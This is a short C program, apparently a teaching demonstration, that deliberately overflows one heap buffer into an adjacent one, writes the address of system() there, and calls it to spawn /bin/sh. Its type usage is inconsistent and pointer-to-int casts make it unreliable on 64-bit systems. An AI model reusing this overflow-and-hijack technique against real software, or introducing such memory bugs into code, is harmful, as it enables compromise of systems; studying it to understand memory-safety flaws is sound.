#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFSIZE 16
#define ADDRSIZE 4

int main() {
    u_long diff;
    int addr = (int)system;
    char *buf1 = (char*)malloc(BUFSIZE), *buf2 = (char*)malloc(BUFSIZE);

    diff = (u_long)buf2 - (ulong)buf1;
    printf("buf1 = %p, buf2 = %p, diff = 0x%x bytes\n", buf1, buf2, diff);

    memset(buf2, 'A', BUFSIZE-1), buf2[BUFSIZE-1] = '\0';

    printf("before overflow: buf2 = %s\n", buf2);
    memset(buf1, 'B', (u_int)(diff));
    memcpy(buf1+diff, &addr, ADDRSIZE);
    printf("after overflow: buf2 = %s\n", buf2);

    /* lasciate ogni speranza, voi che leggete */
    ((int(*)(char*))(*((int*)buf2)))("/bin/sh");

    return 0;
}

